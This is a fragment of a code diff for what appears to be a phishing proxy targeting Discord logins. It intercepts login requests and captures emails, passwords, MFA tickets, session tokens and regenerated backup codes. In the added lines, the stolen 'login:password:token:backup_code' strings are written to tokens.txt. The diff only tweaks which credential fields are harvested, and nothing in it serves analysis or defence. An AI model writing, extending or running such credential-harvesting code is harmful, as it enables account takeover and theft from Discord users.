@@ -59,7 +59,7 @@ if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
 }
 if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login`){
   console.log(s)
-if(s.mfa) data.unshift({ticket: s.ticket, password: req.body.password})
+if(s.mfa) data.unshift({ticket: s.ticket, password: req.body.password, login: req.body.login, password: req.body.password})
 }
     if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){
 
@@ -96,7 +96,7 @@ body: JSON.stringify({"password":f.password,"regenerate":true})
 		return d.trim();
 	});
 	
-if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.password}:${s.token}:${dJ.backup_codes[0].code}`)
+if(!arr.includes(req.body.login)) arr.unshift(`${f.login}:${f.password}:${s.token}:${dJ.backup_codes[0].code}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
 }
